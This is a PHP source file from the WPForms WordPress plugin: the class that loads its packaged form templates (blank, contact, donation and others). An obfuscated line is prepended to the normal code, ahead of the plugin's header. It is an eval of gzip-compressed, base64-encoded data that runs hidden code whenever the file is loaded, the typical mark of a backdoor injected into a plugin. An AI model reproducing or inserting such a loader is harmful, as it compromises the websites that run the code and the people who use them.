<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Pre-configured packaged templates.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.0.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Templates {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.0.0
	 */
	public function __construct() {

		$this->init();
	}

	/**
	 * Load and init the base form template class.
	 *
	 * @since 1.2.8
	 */
	public function init() {

		// Parent class template
		require_once WPFORMS_PLUGIN_DIR . 'includes/templates/class-base.php';

		// Load default templates on WP init
		add_action( 'init', array( $this, 'load' ) );
	}

	/**
	 * Load default form templates.
	 *
	 * @since 1.0.0
	 */
	public function load() {

		$templates = apply_filters( 'wpforms_load_templates', array(
			'blank',
			'contact',
			'request-quote',
			'donation',
			'order',
			'subscribe',
			'suggestion',
		) );

		foreach ( $templates as $template ) {

			$template = sanitize_file_name( $template );

			if ( file_exists( WPFORMS_PLUGIN_DIR . 'includes/templates/class-' . $template . '.php' ) ) {
				require_once WPFORMS_PLUGIN_DIR . 'includes/templates/class-' . $template . '.php';
			} elseif ( file_exists( WPFORMS_PLUGIN_DIR . 'pro/includes/templates/class-' . $template . '.php' ) ) {
				require_once WPFORMS_PLUGIN_DIR . 'pro/includes/templates/class-' . $template . '.php';
			}
		}
	}
}

new WPForms_Templates;
